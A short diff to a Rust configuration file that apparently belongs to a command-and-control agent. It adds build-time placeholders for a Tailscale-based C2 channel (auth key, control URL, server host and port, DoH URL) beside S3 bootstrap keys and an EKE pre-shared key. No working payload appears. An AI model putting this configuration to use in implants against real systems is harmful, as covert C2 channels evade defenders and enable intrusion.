@@ -25,6 +25,16 @@ pub static s3_payload_prefix: &str = "%S3_PAYLOAD_PREFIX%";
 pub static s3_bootstrap_access_key_id: &str = "%S3_BOOTSTRAP_ACCESS_KEY_ID%";
 pub static s3_bootstrap_secret_access_key: &str = "%S3_BOOTSTRAP_SECRET_ACCESS_KEY%";
 
+// Tailscale C2 configuration (stamped at build time)
+pub static use_tailscale: bool = %USE_TAILSCALE%;
+pub static ts_auth_key: &str = "%TS_AUTH_KEY%";
+pub static ts_control_url: &str = "%TS_CONTROL_URL%";
+pub static ts_server_hostname: &str = "%TS_SERVER_HOSTNAME%";
+pub static ts_server_port: &str = "%TS_SERVER_PORT%";
+pub static ts_protocol: &str = "%TS_PROTOCOL%";
+pub static ts_tcp_port: &str = "%TS_TCP_PORT%";
+pub static ts_doh_url: &str = "%TS_DOH_URL%";
+
 // Pre-shared key for EKE (base64-encoded, empty if encryption disabled)
 pub static AESPSK: &str = "%AESPSK%";
 
